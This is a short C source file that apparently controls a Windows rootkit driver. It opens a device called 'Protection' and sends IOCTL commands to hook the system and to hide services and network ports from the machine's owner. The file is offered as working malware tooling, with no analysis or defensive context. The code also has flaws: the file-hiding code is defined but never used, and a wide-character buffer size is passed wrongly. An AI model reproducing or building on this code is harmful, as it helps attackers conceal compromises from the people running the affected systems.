#include <windows.h>
#include <stdio.h>

#define CODEMSG(_number) CTL_CODE(FILE_DEVICE_UNKNOWN,_number , METHOD_BUFFERED,\
	FILE_READ_DATA | FILE_WRITE_DATA)       

#define NO_MSG 2048
#define START_PROTECT 4086
#define START_HIDEFILE 4087
#define START_HIDESERVICES 4088
#define START_HIDEPORT 4089


int CallMyDrivers(char *ID,char *lpBuffer)
{
	HANDLE service = 0;
	HANDLE device = 0;
	char devicepath[256];
	char ret[1024];
	WCHAR ToSend[512];
	DWORD code, bytes;
	unsigned short port;

	device = CreateFile("\\\\.\\Protection",GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);

	if( !device || device==INVALID_HANDLE_VALUE ) {   
		printf("cannot communicate with the driver.\n");
		return FALSE; 
	}

	code = NO_MSG;  

	if( !strcmp(ID,"-hook") ) {
		code = START_PROTECT;
	}
	if( !strcmp(ID,"-port") ) {
		code = START_HIDEPORT;
	}
	if( !strcmp(ID,"-services") ) {
		code = START_HIDESERVICES;
	}

	MultiByteToWideChar(CP_ACP, 0,lpBuffer, -1, ToSend, sizeof(ToSend));
	DeviceIoControl(device, CODEMSG(code), ToSend, (wcslen(ToSend)+1)*2, 
		&ret, sizeof(ret),&bytes,NULL);                       
	CloseHandle(device);
	return TRUE;
}